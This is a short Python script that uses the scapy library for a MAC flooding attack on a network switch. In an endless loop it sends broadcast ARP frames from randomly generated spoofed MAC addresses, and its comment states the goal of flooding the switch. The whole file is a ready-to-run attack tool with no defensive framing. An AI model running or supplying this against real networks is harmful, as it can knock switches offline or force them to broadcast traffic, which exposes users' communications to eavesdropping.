#!/usr/bin/env python
from scapy.all import * # imported the scapy module

vendor = "b8:e8:56:"
destinationMAC = "FF:FF:FF:FF:FF:FF"

while 1:
	randMAC = vendor + ':'.join(RandMAC().split(':')[3:])
	print randMAC
  
	sendp(Ether(src=randMAC ,dst=destinationMAC)/   # here , sending the large amount of fake mac addresses to flood the network switch
  
  
	ARP(op=2, psrc="0.0.0.0", hwdst=destinationMAC)/Padding(load="X"*18),verbose=0)
